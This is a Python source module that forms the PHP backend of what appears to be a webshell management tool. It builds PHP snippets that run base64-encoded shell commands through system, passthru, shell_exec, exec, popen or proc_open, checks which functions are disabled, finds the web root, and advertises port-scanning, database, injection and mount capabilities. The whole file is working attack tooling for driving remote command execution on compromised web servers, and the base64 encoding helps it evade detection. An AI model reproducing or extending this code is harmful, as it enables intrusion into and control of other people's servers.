"""PHP backend — the PHP-specific code fragments, factored out of the executor."""

from __future__ import annotations

import base64

from .base import Backend, CommandBuilder

# Preference order: each maps a PHP function to a snippet that runs a
# base64-encoded command and echoes its combined stdout/stderr.
_EXEC_BUILDERS: dict[str, CommandBuilder] = {
    "system": lambda b64: f"system(base64_decode('{b64}'))",
    "passthru": lambda b64: f"passthru(base64_decode('{b64}'))",
    "shell_exec": lambda b64: f"echo shell_exec(base64_decode('{b64}'))",
    "exec": lambda b64: f"exec(base64_decode('{b64}'),$o);echo implode(chr(10),$o)",
    "popen": lambda b64: (
        f"$h=popen(base64_decode('{b64}'),'r');"
        "while(!feof($h)){echo fread($h,4096);}pclose($h)"
    ),
    "proc_open": lambda b64: (
        "$d=[1=>['pipe','w'],2=>['pipe','w']];"
        f"$p=proc_open(base64_decode('{b64}'),$d,$pp);"
        "echo stream_get_contents($pp[1]).stream_get_contents($pp[2]);"
        "proc_close($p)"
    ),
}


class PHPBackend(Backend):
    name = "php"
    capabilities = frozenset(
        {"command", "fs", "mysql", "pgsql", "portscan", "inject", "mount"}
    )

    def literal(self, value: str) -> str:
        return f"base64_decode('{base64.b64encode(value.encode()).decode()}')"

    def sentinel(self, token: str, code: str) -> str:
        return f"echo '{token}';{code};echo '{token}';"

    def command_builders(self) -> dict[str, CommandBuilder]:
        return _EXEC_BUILDERS

    def disabled_functions_code(self) -> str | None:
        return "echo ini_get('disable_functions')"

    def webroot_code(self) -> str:
        return "echo $_SERVER['DOCUMENT_ROOT']"

    def version_code(self) -> str:
        return "echo phpversion()"
